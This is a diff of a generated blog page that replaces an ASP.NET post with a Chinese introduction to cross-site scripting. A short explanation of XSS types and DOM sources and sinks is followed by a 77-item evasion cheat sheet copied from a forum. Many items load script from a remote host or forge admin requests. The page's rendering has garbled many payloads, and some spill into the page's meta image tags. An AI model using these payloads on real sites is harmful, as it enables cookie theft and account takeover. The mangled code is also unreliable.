@@ -6,20 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://ygjch.github.io">
-  <title>Layout gets current user in the frontend | YGjch&#39;s Blog</title>
+  <title>Xss introduction | YGjch&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Question:I need to change displayName according to current Account.  Firstly, I try to create partial view. Partial view can get data individually but _layout can’t get data.Find solution in stackflow">
-<meta name="keywords" content="asp.net mvc">
+  <meta name="description" content="一、什么是XSS? XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。 这里我们主要注意四点：1、目标网站目标用户；2、浏览器；3、不被预期；4、脚本。 二、XSS有什么危害？ 当我们知道了什么是XSS后，也一定很想知道它到底有什么用，或者有什么危害，如何防御。 关于XSS有关危害，我">
+<meta name="keywords" content="信息安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Layout gets current user in the frontend">
-<meta property="og:url" content="http://ygjch.github.io/2017/09/23/Layout-get-current-user-in-the-frontend/index.html">
+<meta property="og:title" content="Xss introduction">
+<meta property="og:url" content="http://ygjch.github.io/2017/10/14/Xss-introduction/index.html">
 <meta property="og:site_name" content="YGjch&#39;s Blog">
-<meta property="og:description" content="Question:I need to change displayName according to current Account.  Firstly, I try to create partial view. Partial view can get data individually but _layout can’t get data.Find solution in stackflow">
+<meta property="og:description" content="一、什么是XSS? XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。 这里我们主要注意四点：1、目标网站目标用户；2、浏览器；3、不被预期；4、脚本。 二、XSS有什么危害？ 当我们知道了什么是XSS后，也一定很想知道它到底有什么用，或者有什么危害，如何防御。 关于XSS有关危害，我">
 <meta property="og:locale" content="English">
-<meta property="og:updated_time" content="2017-09-23T10:38:46.813Z">
+<meta property="og:image" content="javascript:alert(‘XSS’)">
+<meta property="og:image" content="JaVaScRiPt:alert(‘XSS’)">
+<meta property="og:image" content="javascript:alert(“XSS”)">
+<meta property="og:image" content="javascript:alert(String.fromCharCode(88,83,83))">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/java..省略..XSS%27)">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”jav">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”jav">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”jav">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”jav">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”javascript:alert(‘XSS‘)”">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/java/0script:alert(/”XSS/”)">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/’vbscript:msgbox(“XSS”)’">
+<meta property="og:image" content="http://ygjch.github.io/2017/10/14/Xss-introduction/”http://www.XXX.com/a.php?a=b”">
+<meta property="og:updated_time" content="2017-10-14T09:35:42.550Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Layout gets current user in the frontend">
-<meta name="twitter:description" content="Question:I need to change displayName according to current Account.  Firstly, I try to create partial view. Partial view can get data individually but _layout can’t get data.Find solution in stackflow">
+<meta name="twitter:title" content="Xss introduction">
+<meta name="twitter:description" content="一、什么是XSS? XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。 这里我们主要注意四点：1、目标网站目标用户；2、浏览器；3、不被预期；4、脚本。 二、XSS有什么危害？ 当我们知道了什么是XSS后，也一定很想知道它到底有什么用，或者有什么危害，如何防御。 关于XSS有关危害，我">
+<meta name="twitter:image" content="javascript:alert(‘XSS’)">
   
     <link rel="alternative" href="/atom.xml" title="YGjch&#39;s Blog" type="application/atom+xml">
   
@@ -151,34 +166,168 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Layout-get-current-user-in-the-frontend" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Xss-introduction" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Layout gets current user in the frontend
+      Xss introduction
     </h1>
   
 
         
-        <a href="/2017/09/23/Layout-get-current-user-in-the-frontend/" class="archive-article-date">
-  	<time datetime="2017-09-23T10:21:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-23</time>
+        <a href="/2017/10/14/Xss-introduction/" class="archive-article-date">
+  	<time datetime="2017-10-14T09:34:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Question"><a href="#Question" class="headerlink" title="Question:"></a>Question:</h3><p>I need to change displayName according to current Account. </p>
-<p>Firstly, I try to create partial view. Partial view can get data individually but _layout can’t get data.<br>Find solution in stackflow: <strong>Partial View shares data with _layout. In other words, Model is same in Partial View and _layout.</strong></p>
-<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>We can get model in _layout directly in this method.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">@using LibraryProject.Models</div><div class="line"></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"~/favicon.ico?v=2"</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>NWPU Library System<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'</span> <span class="attr">name</span>=<span class="string">'viewport'</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- bootstrap 3.0.2 --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"~/Content/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line">    <span class="comment">&lt;!-- font Awesome --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"~/Content/css/font-awesome.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div></pre></td></tr></table></figure></p>
-<p>At the beginning, you should add <code>@using LibraryProject.Models</code>. And you can get context after that.</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">    <span class="comment">&lt;!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries --&gt;</span></div><div class="line">    <span class="comment">&lt;!-- WARNING: Respond.js doesn't work if you view the page via file:// --&gt;</span></div><div class="line">    <span class="comment">&lt;!--[if lt IE 9]&gt;</span></div><div class="line"><span class="comment">      &lt;script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"&gt;&lt;/script&gt;</span></div><div class="line"><span class="comment">      &lt;script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"&gt;&lt;/script&gt;</span></div><div class="line"><span class="comment">    &lt;![endif]--&gt;</span></div><div class="line">    @Scripts.Render("http://cdn.datatables.net/1.10.15/js/jquery.dataTables.js")</div><div class="line">    @Styles.Render("http://cdn.datatables.net/1.10.15/css/jquery.dataTables.css")</div><div class="line"></div><div class="line">    @&#123; </div><div class="line">        User user = (User)CheckLogin.Instance.GetUser();</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>Method:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">@&#123;</div><div class="line">	<span class="keyword">User</span> <span class="title">user</span> = (User)CheckLogin.Instance.GetUser();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>can get user Entity. And you can judge Authority and Role, etc… It’s excellent!!</p>
+        <p>一、什么是XSS?</p>
+<p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
+<p>这里我们主要注意四点：1、目标网站目标用户；2、浏览器；3、不被预期；4、脚本。</p>
+<p>二、XSS有什么危害？</p>
+<p>当我们知道了什么是XSS后，也一定很想知道它到底有什么用，或者有什么危害，如何防御。</p>
+<p>关于XSS有关危害，我这里中罗列一段列表，详细介绍不进行更多的赘述：</p>
+<p>挂马<br>盗取用户Cookie。<br>DOS（拒绝服务）客户端浏览器。<br>钓鱼攻击，高级的钓鱼技巧。<br>删除目标文章、恶意篡改数据、嫁祸。<br>劫持用户Web行为，甚至进一步渗透内网。<br>爆发Web2.0蠕虫。<br>蠕虫式的DDoS攻击。<br>蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据。。。<br>三、XSS分类</p>
+<p>XSS有三类：反射型XSS(非持久型)、存储型XSS(持久型)和DOM XSS。</p>
+<p>1、反射型XSS</p>
+<p>发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。</p>
+<p>一个简单的例子：</p>
+<p><a href="http://www.a.com/xss/reflect.php的代码如下：" target="_blank" rel="external">http://www.a.com/xss/reflect.php的代码如下：</a></p>
+<p>&lt;?php</p>
+<p>echo $_GET[‘x’];</p>
+<p>?&gt;</p>
+<p>如果输入x的值未经任何过滤就直接输出，提交：</p>
+<p><a href="http://www.foo.com/xss/reflect.php?x=" target="_blank" rel="external">http://www.foo.com/xss/reflect.php?x=</a><script>alert(1)</script></p>
+<p>则alert()函数会在浏览器触发。</p>
+<p>2、存储型XSS</p>
+<p>存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码</p>
+<p>最典型的例子是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与Js解析执行，于是触发了XSS攻击。</p>
+<p>3、DOM XSS</p>
+<p>DOM XSS和反射型XSS、存储型XSS的差别在于DOM XSS的代码并不需要服务器参与，触发XSS靠的是浏览器端的DOM解析，完全是客户端的事情。</p>
+<p><a href="http://www.a.com/xss/domxss.html代码如下：" target="_blank" rel="external">http://www.a.com/xss/domxss.html代码如下：</a></p>
+<script>
 
+eval(location.hash.substr(1));
+
+</script>
+
+<p>触发方式为：<a href="http://www.a.com/xss/domxss.html#alert(1" target="_blank" rel="external">http://www.a.com/xss/domxss.html#alert(1</a>)</p>
+<p>这个URL#后的内容是不会发送到服务器端的，仅仅在客户端被接收并解执行。</p>
+<p>常见的输入点有：</p>
+<p>document.URL</p>
+<p>document.URLUnencoded</p>
+<p>document.location</p>
+<p>document.referrer</p>
+<p>window.location</p>
+<p>window.name</p>
+<p>xhr请求回来的数据</p>
+<p>document.cookie</p>
+<p>表单项的值</p>
+<p>常见的输出点有：</p>
+<p>直接输出html内容，如：</p>
+<p>document.write(…)</p>
+<p>document.writeln(…)</p>
+<p>document.body.innerHtml=…</p>
+<p>直接修改DOM树（包括DHTML）如：</p>
+<p>document.forms[0].action…(以及其他集合，如：一些对象的src/href属性等)</p>
+<p>document.attachEvent(…)</p>
+<p>document.create…(…)</p>
+<p>document.execCommand(…)</p>
+<p>document.body. …(直接通过body对象访问DOM)</p>
+<p>window.attachEvent(…)</p>
+<p>替换document URL,如：</p>
+<p>document.location=…(以及直接赋值给location的href,host,hostname属性)</p>
+<p>document.location.hostname=…</p>
+<p>document.location.replace(…)</p>
+<p>document.location.assign(…)</p>
+<p>document.URL=…</p>
+<p>window.navigate(…)</p>
+<p>打开或修改新窗口，如：</p>
+<p>document.open(…)</p>
+<p>window.open(…)</p>
+<p>window.location.href=…(以及直接赋值给location的href,host,hostname属性)直接执行脚本，如：</p>
+<p>eval(…)</p>
+<p>window.execScript(…)</p>
+<p>window.setInterval(…)</p>
+<p>window.setTimeout(…)</p>
+<p><strong><strong><strong><strong><strong><strong><strong><strong><strong>___</strong></strong></strong></strong></strong></strong></strong></strong></strong>附常见的XSS攻击方法<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>___</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
+<p>(1)普通的XSS JavaScript注入</p>
+<p><script src="http://3w.org/XSS/xss.js"></script><br>(2)IMG标签XSS使用JavaScript命令</p>
+<p><script src="http://3w.org/XSS/xss.js"></script><br>(3)IMG标签无分号无引号</p>
+<p><img src="javascript:alert(‘XSS’)"><br>(4)IMG标签大小写不敏感</p>
+<p><img src="JaVaScRiPt:alert(‘XSS’)"><br>(5)HTML编码(必须有分号)</p>
+<p><img src="javascript:alert(“XSS”)"><br>(6)修正缺陷IMG标签</p>
+<p>&lt;IMG “””&gt;<script>alert(“XSS”)</script>”&gt;<br>(7)formCharCode标签(计算器)</p>
+<p><img src="javascript:alert(String.fromCharCode(88,83,83))"><br>(8)UTF-8的Unicode编码(计算器)</p>
+<p>&lt;IMG SRC=jav..省略..S’)&gt;<br>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
+<p>&lt;IMG SRC=jav..省略..S’)&gt;<br>(10)十六进制编码也是没有分号(计算器)</p>
+<p><img src="&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29"><br>(11)嵌入式标签,将Javascript分开</p>
+<p><img src="”jav" ascript:alert(‘xss’);”=""><br>(12)嵌入式编码标签,将Javascript分开</p>
+<p><img src="”jav" ascript:alert(‘xss’);”=""><br>(13)嵌入式换行符</p>
+<p><img src="”jav" ascript:alert(‘xss’);”=""><br>(14)嵌入式回车</p>
+<p><img src="”jav" ascript:alert(‘xss’);”=""><br>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
+<p><img src="”javascript:alert(‘XSS‘)”"><br>(16)解决限制字符(要求同页面)</p>
+<p><script>z=’document.’</script></p>
+<p><script>z=z+’write(“‘</script></p>
+<p><script>z=z+’<script’</script></p>
+<p><script>z=z+’ src=ht’</script></p>
+<p><script>z=z+’tp://ww’</script></p>
+<p><script>z=z+’w.shell’</script></p>
+<p><script>z=z+’.net/1.’</script></p>
+<p><script>z=z+’js&gt;</sc’</script></p>
+<p><script>z=z+’ript&gt;”)’</script></p>
+<p><script>eval_r(z)</script><br>(17)空字符12-7-1 T00LS - Powered by Discuz! Board<br><a href="https://www.t00ls.net/viewthread.php?action=printable&amp;tid=15267" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?action=printable&amp;tid=15267</a> 2/6<br>perl -e ‘print “<img src="java\0script:alert(\”XSS\”)">”;’ &gt; out<br>(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用<br>perl -e ‘print “<scr\0ipt>alert(\”XSS\”)</scr\0ipt>”;’ &gt; out<br>(19)Spaces和meta前的IMG标签</p>
+<p><img src="”" javascript:alert(‘xss’);”=""><br>(20)Non-alpha-non-digit XSS</p>
+<p><script xss="" src="”http://3w.org/XSS/xss.js”"></script><br>(21)Non-alpha-non-digit XSS to 2</p>
+<p><body onload!#$%&()*~+-_.,:;?@[="" |\]^`="alert(“XSS”)"><br>(22)Non-alpha-non-digit XSS to 3</body></p>
+<p><a href="SCRIPT/SRC=”http://3w.org/XSS/xss.js”">SCRIPT/SRC=”http://3w.org/XSS/xss.js”</a><br>(23)双开括号<br>&lt;<script>alert(“XSS”);//&lt;</script><br>(24)无结束脚本标记(仅火狐等浏览器)</p>
+<p><script src="http://3w.org/XSS/xss.js?<B"><br>(25)无结束脚本标记2</p>
+<p><SCRIPT SRC=//3w.org/XSS/xss.js><br>(26)半开的HTML/JavaScript XSS</p>
+<p>&lt;IMG SRC=”javascript:alert(‘XSS’)”<br>(27)双开角括号</p>
+<p>&lt;iframe src=<a href="http://3w.org/XSS.html">http://3w.org/XSS.html</a> &lt;<br>(28)无单引号 双引号 分号</p>
+<p><SCRIPT>a=/XSS/<br>alert(a.source)</script><br>(29)换码过滤的JavaScript<br>\”;alert(‘XSS’);//<br>(30)结束Title标签<br><script>alert(“XSS”);</script><br>(31)Input Image</p>
+<p><input src="”javascript:alert(‘XSS’);”"><br>(32)BODY Image</p>
+<p><body background="”javascript:alert(‘XSS’)”"><br>(33)BODY标签</body></p>
+<p><body(‘xss’)><br>(34)IMG Dynsrc</body(‘xss’)></p>
+<p><img dynsrc="”javascript:alert(‘XSS’)”"><br>(35)IMG Lowsrc</p>
+<p><img lowsrc="”javascript:alert(‘XSS’)”"><br>(36)BGSOUND</p>
+<p><bgsound src="”javascript:alert(‘XSS’);”"><br>(37)STYLE sheet</bgsound></p>
+<p><link rel="”stylesheet”" href="”javascript:alert(‘XSS’);”"><br>(38)远程样式表</p>
+<p><link rel="”stylesheet”" href="”http://3w.org/xss.css”"><br>(39)List-style-image(列表式)</p>
+<p><style>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</style><ul><li>XSS<br>(40)IMG VBscript</li></ul></p>
+<p><img src="’vbscript:msgbox(“XSS”)’"><ul><li>XSS<br>(41)META链接url</li></ul></p>
+<p><meta http-equiv="”refresh”" content="”0;" url="http://;URL=javascript:alert(‘XSS’);”"><br>(42)Iframe</p>
+<p><iframe src="”javascript:alert(‘XSS’);”"></iframe><br>(43)Frame</p>
+<p><frameset><frame src="”javascript:alert(‘XSS’);”"></frameset>12-7-1 T00LS - Powered by Discuz! Board<br><a href="https://www.t00ls.net/viewthread.php?action=printable&amp;tid=15267" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?action=printable&amp;tid=15267</a> 3/6<br>(44)Table</p>
+<p><table background="”javascript:alert(‘XSS’)”"><br>(45)TD</table></p>
+<p><table><td background="”javascript:alert(‘XSS’)”"><br>(46)DIV background-image</td></table></p>
+<p><div style="”background-image:" url(javascript:alert(‘xss’))”=""><br>(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-<br>8&amp;13&amp;12288&amp;65279)</div></p>
+<p><div style="”background-image:" url(javascript:alert(‘xss’))”=""><br>(48)DIV expression</div></p>
+<p><div style="”width:" expression_r(alert(‘xss’));”=""><br>(49)STYLE属性分拆表达</div></p>
+<p><img style="”xss:expression_r(alert(‘XSS’))”"><br>(50)匿名STYLE(组成:开角号和一个字母开头)</p>
+<p><xss style="”xss:expression_r(alert(‘XSS’))”"><br>(51)STYLE background-image</xss></p>
+<p><style>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</style><a class="XSS"></a><br>(52)IMG STYLE方式<br>exppression(alert(“XSS”))’&gt;<br>(53)STYLE background</p>
+<p><style><STYLE
+type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</style><br>(54)BASE</p>
+<p><base href="”javascript:alert(‘XSS’);//”"><br>(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS</p>
+<p><embed src="”http://3w.org/XSS/xss.swf”"><br>(56)在flash中使用ActionScrpt可以混进你XSS的代码<br>a=”get”;<br>b=”URL(\””;<br>c=”javascript:”;<br>d=”alert(‘XSS’);\”)”;<br>eval_r(a+b+c+d);<br>(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上</p>
+<p><html xmlns:xss=""><br>&lt;?import namespace=”xss” implementation=”<a href="http://3w.org/XSS/xss.htc”&gt;" target="_blank" rel="external">http://3w.org/XSS/xss.htc”&gt;</a></html></p>
+<p><xss:xss>XSS</xss:xss><br><br>(58)如果过滤了你的JS你可以在图片里添加JS代码来利用</p>
+<p><script src="””"></script><br>(59)IMG嵌入式命令,可执行任意命令</p>
+<p><img src="”http://www.XXX.com/a.php?a=b”"><br>(60)IMG嵌入式命令(a.jpg在同服务器)<br>Redirect 302 /a.jpg <a href="http://www.XXX.com/admin.asp&amp;deleteuser" target="_blank" rel="external">http://www.XXX.com/admin.asp&amp;deleteuser</a><br>(61)绕符号过滤</p>
+<p><script a="”">” SRC=”<a href="http://3w.org/xss.js”&gt;">http://3w.org/xss.js”&gt;</a></script><br>(62)</p>
+<p><script =”="">” SRC=”<a href="http://3w.org/xss.js”&gt;">http://3w.org/xss.js”&gt;</a></script><br>(63)</p>
+<p><script a="”">” ” SRC=”<a href="http://3w.org/xss.js”&gt;">http://3w.org/xss.js”&gt;</a></script><br>(64)</p>
+<p><script “a="’">’” SRC=”<a href="http://3w.org/xss.js”&gt;">http://3w.org/xss.js”&gt;</a></script><br>(65)</p>
+<p><script a="`">` SRC=”<a href="http://3w.org/xss.js”&gt;">http://3w.org/xss.js”&gt;</a></script><br>(66)12-7-1 T00LS - Powered by Discuz! Board<br><a href="https://www.t00ls.net/viewthread.php?action=printable&amp;tid=15267" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?action=printable&amp;tid=15267</a> 4/6</p>
+<p><script a="”">’&gt;” SRC=”<a href="http://3w.org/xss.js”&gt;">http://3w.org/xss.js”&gt;</a></script><br>(67)</p>
+<p><script>document.write(“<SCRI”);</script>PT SRC=”<a href="http://3w.org/xss.js”&gt;" target="_blank" rel="external">http://3w.org/xss.js”&gt;</a><br><br>(68)URL绕行</p>
+<a href="”http://127.0.0.1/”">XSS</a><br>(69)URL编码<br><a href="”http://3w.org”">XSS</a><br>(70)IP十进制<br><a href="”http://3232235521″">XSS</a><br>(71)IP十六进制<br><a href="”http://0xc0.0xa8.0×00.0×01″">XSS</a><br>(72)IP八进制<br><a href="”http://0300.0250.0000.0001″">XSS</a><br>(73)混合编码<br>&lt;A HREF=”h<br>tt p://6 6.000146.0×7.147/””&gt;XSS<br>(74)节省[http:]<br><a href="”//www.google.com/”">XSS</a><br>(75)节省[www]<br><a href="”http://google.com/”">XSS</a><br>(76)绝对点绝对DNS<br><a href="”http://www.google.com./”">XSS</a><br>(77)javascript链接<br><a href="”javascript:document.location=’http://www.google.com/’”">XSS</a>
       
 
 	  <!-- 目录内容 -->
@@ -190,7 +339,7 @@
             <div id="toc-article" class="toc-article">
                 <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
                 <strong class="toc-title">文章目录</strong>
-                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Question"><span class="toc-number">1.</span> <span class="toc-text">Question:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">2.</span> <span class="toc-text">Solution:</span></a></li></ol>
+                
            </div>
            <script type="text/javascript">
             function showToc(){
@@ -219,7 +368,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">asp.net mvc</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">信息安全</a>
         		</li>
       		
 		</ul>
@@ -275,7 +424,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://ygjch.github.io/2017/09/23/Layout-get-current-user-in-the-frontend/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://ygjch.github.io/2017/10/14/Xss-introduction/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -289,18 +438,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/09/24/sql-server-connnect-error-233/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sql server connnect error: 233
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/09/21/asp-net-mvc-Seed-init/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">asp.net mvc Seed init</div>
+    <a href="/2017/10/12/富文本编辑器插入图片显示-html-代码问题/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">富文本编辑器插入图片显示 html 代码问题</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -327,7 +467,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Question"><span class="toc-number">1.</span> <span class="toc-text">Question:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution"><span class="toc-number">2.</span> <span class="toc-text">Solution:</span></a></li></ol>
+                    目录，不存在的…
                     </div>
                 </span>
             </div>
@@ -343,7 +483,7 @@
   
 
   
-  <div id="SOHUCS" sid="Layout-get-current-user-in-the-frontend" ></div> 
+  <div id="SOHUCS" sid="Xss-introduction" ></div> 
 <script type="text/javascript"> 
 (function(){ 
 var appid = "cytdLJ4RN"; 
